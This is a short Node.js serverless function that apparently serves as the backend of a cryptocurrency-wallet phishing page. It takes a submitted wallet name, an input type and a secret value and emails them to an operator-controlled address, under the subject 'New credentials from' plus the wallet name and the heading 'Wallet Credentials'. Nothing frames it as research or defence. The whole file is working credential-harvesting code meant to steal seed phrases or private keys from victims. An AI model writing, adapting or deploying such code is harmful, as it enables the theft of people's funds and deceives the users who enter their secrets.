const nodemailer = require('nodemailer');

module.exports = async (req, res) => {
    // Only allow POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { wallet, inputType, value, timestamp } = req.body;

    if (!wallet || !value) {
        return res.status(400).json({ error: 'Missing fields' });
    }

    // Configure email transport using environment variables
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS,
        },
    });

    try {
        await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_TO,
            subject: `New credentials from ${wallet}`,
            html: `
                <h2>Wallet Credentials</h2>
                <p><strong>Wallet:</strong> ${wallet}</p>
                <p><strong>Input Type:</strong> ${inputType}</p>
                <p><strong>Value:</strong> ${value}</p>
                <p><strong>Timestamp:</strong> ${timestamp}</p>
            `,
        });
        res.status(200).json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ success: false, error: err.message });
    }
};